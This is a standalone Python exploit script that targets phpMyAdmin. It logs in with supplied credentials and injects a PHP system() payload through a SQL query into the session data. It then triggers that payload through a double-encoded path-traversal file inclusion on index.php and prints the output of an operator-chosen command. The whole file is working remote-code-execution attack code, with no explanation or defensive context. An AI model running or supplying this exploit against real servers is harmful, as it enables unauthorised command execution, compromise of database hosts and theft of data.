#!/usr/bin/env python

import re, requests, sys, html


def get_token(content):
  s = re.search('token"\s*value="(.*?)"', content)
  token = html.unescape(s.group(1))
  return token

ipaddr = sys.argv[1]
port = sys.argv[2]
path = sys.argv[3]
username = sys.argv[4]
password = sys.argv[5]
command = sys.argv[6]

url = "http://{}:{}{}".format(ipaddr,port,path)

url1 = url + "/index.php"
r = requests.get(url1)
content = r.content.decode('utf-8')

s = re.search('PMA_VERSION:"(\d+\.\d+\.\d+)"', content)
version = s.group(1)

cookies = r.cookies
token = get_token(content)

p = {'token': token, 'pma_username': username, 'pma_password': password}
r = requests.post(url1, cookies = cookies, data = p)
content = r.content.decode('utf-8')
s = re.search('logged_in:(\w+),', content)
logged_in = s.group(1)

cookies = r.cookies
token = get_token(content)

url2 = url + "/import.php"
payload = '''select '<?php system("{}") ?>';'''.format(command)
p = {'table':'', 'token': token, 'sql_query': payload }
r = requests.post(url2, cookies = cookies, data = p)

session_id = cookies.get_dict()['phpMyAdmin']
url3 = url + "/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_{}".format(session_id)
r = requests.get(url3, cookies = cookies)

content = r.content.decode('utf-8', errors="replace")
s = re.search("select '(.*?)\n'", content, re.DOTALL)
if s != None:
  print(s.group(1))
